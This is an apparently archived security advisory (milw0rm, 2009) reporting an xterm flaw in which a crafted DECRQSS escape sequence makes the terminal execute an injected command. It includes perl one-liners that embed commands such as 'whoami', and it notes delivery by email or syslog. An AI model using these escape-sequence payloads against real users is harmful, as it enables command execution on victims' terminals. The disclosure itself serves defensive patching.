@@ -1,0 +1,27 @@
+Package: xterm
+Version: 222-1etch2
+Severity: grave
+Tags: security patch
+Justification: user security hole
+
+
+DECRQSS Device Control Request Status String "DCS $ q" simply echoes
+(responds with) invalid commands. For example,
+perl -e 'print "\eP\$q\nbad-command\n\e\\"'
+would run bad-command.
+
+Exploitability is the same as for the "window title reporting" issue
+in DSA-380: include the DCS string in an email message to the victim,
+or arrange to have it in syslog to be viewed by root.
+
+Original:
+http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=510030
+
+Test:
+
+perl -e 'print "\eP\$q\nwhoami\n\e\\"' > bla.log
+cat bla.log
+
+If whoami gets executed you should update. 
+
+# milw0rm.com [2009-01-06]
